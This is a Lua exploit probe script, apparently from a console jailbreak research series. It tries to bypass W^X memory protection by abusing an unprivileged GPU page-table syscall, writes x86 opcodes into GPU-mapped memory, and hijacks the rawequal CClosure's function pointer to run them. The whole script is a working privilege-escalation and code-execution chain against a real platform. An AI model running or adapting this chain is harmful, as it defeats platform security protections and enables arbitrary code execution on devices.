-- CRASH_CLASS: MODERATE
-- PROBE 98a: GPU PTE attribute modification → W^X bypass chain
--
-- Context: Deep analysis of sys 653 reveals NO priv_check in the syscall entry.
-- It modifies page table attributes for GPU-mapped memory. Combined primitives:
--   1. GPU mmap (sys 477) → creates RW GPU memory at known address
--   2. sys 547 (VM region query) → reads protection/object type for our pages
--   3. sys 653 (GPU PTE modifier) → changes page attributes with no privilege check
--   4. If execute bit can be set → write shellcode → CClosure redirect
--
-- sys 653 entry mask: 0xffafffff (only bits 20, 22 allowed in arg0)
-- Direct page modifier at handler+0x1850 checks:
--   - Address bounds vs proc->0x200 (our process VM map)
--   - Page type bitmask 0x409 (types 0, 3, 10)
--   - Object type at +0x9d must be 0xb (GPU VM object)
--   - Flag consistency: (arg_flags & 0xcc) | extra_flags == 0
--
-- Attack chain: GPU mmap → verify object type 0xb via sys 547 → sys 653 modify
-- PTE attrs → verify protection changed → write code → execute
--
-- Section A: sys 547 VM region query on GPU mmap pages (object type + protection)
-- Section B: sys 653 reachability with GPU mmap addresses
-- Section C: PTE attribute sweep — try to change protection on GPU pages
-- Section D: Combined W^X bypass — modify attrs → write nops → CClosure redirect

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 98a: GPU PTE W^X BYPASS ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc477 = make_syscall(477)   -- mmap (GPU)
local sc547 = make_syscall(547)   -- VM region query
local sc653 = make_syscall(653)   -- GPU PTE attribute modifier
local sc674 = make_syscall(674)   -- VM map enumeration
local sc624 = make_syscall(624)   -- VM op counter (baseline)
local sc20  = make_syscall(20)    -- getpid

if TEST_SECTION == "A" then
    print("--- Section A: VM region query on GPU mmap pages ---")
    print("  sys 547: address → start/end/protection/object info")
    print("")

    -- Create GPU mmap region
    print("[A1] Creating GPU mmap (256 pages = 4MB):")
    local ok, gpu = pcall(function()
        return sc477(uint64(0), uint64(256 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("  ret=" .. (ok and fmt(gpu) or "PCALL-FAIL"))
    local gpu_h, gpu_l = 0, 0
    if ok then
        gpu_h, gpu_l = get_hi_lo(gpu)
        print("  addr=" .. fmt(gpu))
    end
    print("")

    if ok and (gpu_h ~= 0 or gpu_l ~= 0) and gpu_h ~= 0xFFFFFFFF then
        -- sys 547: query region info for GPU page
        -- Args: address (arg0), output_ptr (arg1)
        -- Output: 0x18 bytes (start, end, protection info)
        local out = memory.alloc(0x40)

        print("[A2] sys 547 on GPU mmap address:")
        for i = 0, 0xF do safe_wd(out + i * 4, 0xDEAD0000 + i) end

        ok, rv = pcall(function()
            return sc547(uint64(gpu), uint64(out))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))

        if ok and to_num(rv) == 0 then
            -- Dump 0x18 bytes of output
            print("  Region info (0x18 bytes):")
            for i = 0, 5 do
                local val = safe_rq(out + i * 8)
                print(string.format("    +0x%02X: %s", i * 8, val and fmt(val) or "nil"))
            end

            -- Check protection field
            local prot_lo = safe_rd(out + 0x10) or 0
            local prot_hi = safe_rd(out + 0x14) or 0
            print(string.format("  protection: 0x%X (lo) 0x%X (hi)", prot_lo, prot_hi))

            -- Check if any field looks like object type info
            for i = 0, 0x17 do
                local byte_val = safe_rd(out + i)
                if byte_val and (byte_val == 0x0B or byte_val == 0xB) then
                    print(string.format("  *** OBJECT TYPE 0xB AT OFFSET +0x%X ***", i))
                end
            end
        end
        print("")

        -- Also query heap memory for comparison
        local heap = memory.alloc(0x4000)
        print("[A3] sys 547 on heap address (comparison):")
        for i = 0, 0xF do safe_wd(out + i * 4, 0xDEAD0000 + i) end
        ok, rv = pcall(function()
            return sc547(uint64(heap), uint64(out))
        end)
        print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
        if ok and to_num(rv) == 0 then
            for i = 0, 2 do
                local val = safe_rq(out + i * 8)
                print(string.format("    +0x%02X: %s", i * 8, val and fmt(val) or "nil"))
            end
        end
        print("")

        -- Query eboot .text for RX comparison
        local pipe_str = tostring(syscall.pipe)
        local eboot_str = pipe_str:match("eboot%.bin @ (0x[0-9a-fA-F]+)")
        if eboot_str then
            print("[A4] sys 547 on eboot .text (RX comparison):")
            for i = 0, 0xF do safe_wd(out + i * 4, 0xDEAD0000 + i) end
            ok, rv = pcall(function()
                return sc547(uint64(eboot_str), uint64(out))
            end)
            print("  ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
            if ok and to_num(rv) == 0 then
                for i = 0, 2 do
                    local val = safe_rq(out + i * 8)
                    print(string.format("    +0x%02X: %s", i * 8, val and fmt(val) or "nil"))
                end
            end
        end
    end

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: sys 653 reachability with GPU pages ---")
    print("  NO priv_check in handler — only mask check on arg0")
    print("  Entry mask: 0xffafffff (bits 20, 22 only)")
    print("")

    -- Create GPU mmap
    print("[B1] GPU mmap:")
    local ok, gpu = pcall(function()
        return sc477(uint64(0), uint64(256 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("  addr=" .. (ok and fmt(gpu) or "FAIL"))
    local gpu_h, gpu_l = 0, 0
    if ok then gpu_h, gpu_l = get_hi_lo(gpu) end
    print("")

    -- sys 653 takes 1 arg: pointer to parameter structure
    -- From deep analysis: arg0 validated against mask 0xffafffff
    -- This means arg0 & 0xffafffff must be zero → only bits 20 and 22 can be set
    -- So valid arg0 values: 0x0, 0x100000, 0x400000, 0x500000

    -- Test basic reachability with various arg0 values
    print("[B2] sys 653 arg0 sweep (raw values):")
    local test_args = {0, 0x100000, 0x400000, 0x500000, 1, 0xFF}
    for _, arg in ipairs(test_args) do
        ok, rv = pcall(function()
            return sc653(uint64(arg))
        end)
        if ok then
            print(string.format("  arg0=0x%06X: ret=%s", arg, fmt(rv)))
        else
            print(string.format("  arg0=0x%06X: PCALL-FAIL", arg))
        end
    end
    print("")

    -- Now try with pointer to a struct containing GPU address
    -- The handler reads from a struct, not directly
    print("[B3] sys 653 with pointer to param struct:")
    local param = memory.alloc(0x100)

    -- Try struct layout: addr at +0x00, size/flags at +0x08
    for trial = 1, 4 do
        for i = 0, 0x3F do safe_wd(param + i * 4, 0) end

        if trial == 1 then
            -- Zero struct
            print("  trial 1 (zero struct):")
        elseif trial == 2 then
            -- GPU addr at +0x00
            safe_wq(param, uint64(gpu))
            safe_wq(param + 8, uint64(0x4000))
            print("  trial 2 (gpu addr+size):")
        elseif trial == 3 then
            -- GPU addr + flags with bit 20 set
            safe_wq(param, uint64(gpu))
            safe_wd(param + 8, 0x100000)
            print("  trial 3 (gpu addr + flag 0x100000):")
        elseif trial == 4 then
            -- Small integer (not a pointer)
            safe_wd(param, 0)
            safe_wd(param + 4, 0)
            print("  trial 4 (zero addr):")
        end

        ok, rv = pcall(function()
            return sc653(uint64(param))
        end)
        print("    ret=" .. (ok and fmt(rv) or "PCALL-FAIL"))
    end
    print("")

    -- Stability
    print("[B4] Stability:")
    ok, rv = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok and fmt(rv) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: PTE attribute sweep on GPU pages ---")
    print("  Try to change protection attributes via sys 653")
    print("")

    -- GPU mmap
    local ok, gpu = pcall(function()
        return sc477(uint64(0), uint64(256 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("[C1] GPU addr=" .. (ok and fmt(gpu) or "FAIL"))
    local gpu_h, gpu_l = 0, 0
    if ok then gpu_h, gpu_l = get_hi_lo(gpu) end
    print("")

    -- Write test pattern to first GPU page (verify RW)
    print("[C2] Verify RW on GPU pages:")
    safe_wd(gpu, 0x41414141)
    local val = safe_rd(gpu)
    print("  write/read: " .. (val == 0x41414141 and "OK (RW confirmed)" or "FAIL"))
    print("")

    -- Query protection BEFORE modification
    local out = memory.alloc(0x40)
    print("[C3] Protection BEFORE sys 653:")
    for i = 0, 0xF do safe_wd(out + i * 4, 0) end
    ok, rv = pcall(function() return sc547(uint64(gpu), uint64(out)) end)
    if ok and to_num(rv) == 0 then
        for i = 0, 2 do
            print(string.format("    +0x%02X: %s", i * 8, fmt(safe_rq(out + i * 8))))
        end
    end
    print("")

    -- Try sys 653 with different param struct layouts
    -- The handler reads a struct from arg0 pointer
    local param = memory.alloc(0x200)

    -- Layout hypothesis from deep analysis:
    -- The syscall entry reads arg0 (single arg), validates against mask 0xffafffff
    -- Then reads proc fields +0x5d0/+0x5c4 (budget context, allocation context)
    -- Allocates tracking object, links into global list

    -- The "arg0" itself might be a combined flags/address value
    -- Mask 0xffafffff blocks all bits EXCEPT 20 and 22
    -- Bit 20 (0x100000) and bit 22 (0x400000) = page type selectors

    print("[C4] sys 653 with direct address values (combined flags):")
    -- Try GPU address with attribute bits 20/22
    local gpu_val_l = gpu_l
    local gpu_val_h = gpu_h

    local combos = {
        {gpu_val_h, gpu_val_l, "raw GPU addr"},
        {gpu_val_h, gpu_val_l + 0x100000, "GPU + bit 20"},
        {gpu_val_h, gpu_val_l + 0x400000, "GPU + bit 22"},
        {0, 0x100000, "just bit 20"},
        {0, 0x400000, "just bit 22"},
        {0, 0x500000, "bits 20+22"},
    }

    for _, combo in ipairs(combos) do
        local arg_val
        if combo[1] == 0 then
            arg_val = uint64(combo[2])
        else
            arg_val = uint64(string.format("0x%X%08X", combo[1], combo[2]))
        end

        ok, rv = pcall(function()
            return sc653(arg_val)
        end)
        print(string.format("  %s: ret=%s", combo[3], ok and fmt(rv) or "PCALL-FAIL"))
    end
    print("")

    -- Check protection AFTER
    print("[C5] Protection AFTER sys 653 attempts:")
    for i = 0, 0xF do safe_wd(out + i * 4, 0) end
    ok, rv = pcall(function() return sc547(uint64(gpu), uint64(out)) end)
    if ok and to_num(rv) == 0 then
        for i = 0, 2 do
            print(string.format("    +0x%02X: %s", i * 8, fmt(safe_rq(out + i * 8))))
        end
    end
    print("")

    -- Verify GPU pages still work
    print("[C6] Verify RW still works:")
    val = safe_rd(gpu)
    print("  read: " .. (val ~= nil and string.format("0x%X", val) or "FAIL"))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Full W^X bypass attempt ---")
    print("  If sys 653 can set execute: write code → redirect → execute")
    print("")

    -- This section is only meaningful if section C shows attribute changes
    -- For now, test the full chain even if protection doesn't change,
    -- to verify each step independently

    -- GPU mmap
    local ok, gpu = pcall(function()
        return sc477(uint64(0), uint64(256 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("[D1] GPU addr=" .. (ok and fmt(gpu) or "FAIL"))
    print("")

    if ok then
        -- Write "ret" gadget (0xC3) at GPU page start
        print("[D2] Writing ret (0xC3) to GPU page:")
        memory.write_byte(gpu, 0xC3)     -- ret
        memory.write_byte(gpu + 1, 0x90) -- nop
        memory.write_byte(gpu + 2, 0x90) -- nop
        memory.write_byte(gpu + 3, 0x90) -- nop
        local b0 = safe_rd(gpu) or 0
        print("  bytes: " .. string.format("0x%08X", b0))
        print("")

        -- Write "xor eax,eax; ret" (returns 0) at +0x10
        print("[D3] Writing xor eax,eax; ret at +0x10:")
        memory.write_byte(gpu + 0x10, 0x31) -- xor eax, eax
        memory.write_byte(gpu + 0x11, 0xC0)
        memory.write_byte(gpu + 0x12, 0xC3) -- ret
        memory.write_byte(gpu + 0x13, 0x90) -- nop
        print("  written")
        print("")

        -- Write "mov eax, 0x42; ret" (returns 0x42) at +0x20
        print("[D4] Writing mov eax, 0x42; ret at +0x20:")
        memory.write_byte(gpu + 0x20, 0xB8) -- mov eax, imm32
        memory.write_byte(gpu + 0x21, 0x42) -- 0x42
        memory.write_byte(gpu + 0x22, 0x00)
        memory.write_byte(gpu + 0x23, 0x00)
        memory.write_byte(gpu + 0x24, 0x00)
        memory.write_byte(gpu + 0x25, 0xC3) -- ret
        print("  written")
        print("")

        -- Try CClosure redirect to GPU page address
        -- This will only succeed if the page has execute permission
        print("[D5] CClosure redirect test to GPU page:")
        print("  NOTE: Will fail with SIGILL/SIGSEGV if page is NX")
        print("  This is the decisive test")
        print("")

        -- Save rawequal's original +0x20
        local orig_fn = nil
        local rawequal_addr = nil
        repeat
            -- Find rawequal CClosure
            local re_str = tostring(rawequal)
            local re_addr = re_str:match("0x[0-9a-fA-F]+")
            if not re_addr then
                print("  Cannot find rawequal address")
                break
            end
            rawequal_addr = uint64(re_addr)
            print("  rawequal CClosure: " .. re_addr)

            -- Read original +0x20 (C function pointer)
            orig_fn = safe_rq(rawequal_addr + 0x20)
            if not orig_fn then
                print("  Cannot read +0x20")
                break
            end
            print("  original fn: " .. fmt(orig_fn))

            -- Write GPU address to +0x20
            local write_ok = safe_wq(rawequal_addr + 0x20, uint64(gpu + 0x10))
            if not write_ok then
                print("  Cannot write +0x20")
                break
            end
            print("  redirected to: " .. fmt(gpu + 0x10))

            -- Call rawequal — if GPU page is executable, returns 0 (xor eax,eax)
            -- If NX, crashes (SIGILL/SIGSEGV caught by pcall)
            local call_ok, call_rv = pcall(function()
                return rawequal(1, 2)
            end)
            print("  call result: " .. (call_ok and tostring(call_rv) or "PCALL-FAIL"))

            if call_ok then
                print("  *** GPU PAGE IS EXECUTABLE! W^X BYPASS CONFIRMED! ***")
                local rv_num = to_num(call_rv)
                if rv_num == 0 then
                    print("  *** xor eax,eax executed correctly (returned 0) ***")
                end
            else
                print("  (page is NX as expected — need sys 653 to flip protection)")
            end

            -- Restore original
            safe_wq(rawequal_addr + 0x20, orig_fn)
            print("  restored original fn")
        until true
    end

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 98a COMPLETE ===")
